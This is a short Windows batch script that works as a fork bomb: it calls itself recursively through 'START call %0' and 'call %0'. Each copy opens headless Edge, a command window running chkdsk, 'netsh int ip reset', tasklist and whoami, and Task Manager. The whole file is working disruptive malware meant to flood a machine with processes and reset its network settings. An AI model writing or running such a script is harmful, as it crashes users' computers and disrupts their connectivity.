@echo off
START call %0
start msedge --headless --no-remote
start cmd.exe /k "chkdsk /f /r & netsh int ip reset & tasklist & dir & whoami &"
start taskmgr 
call %0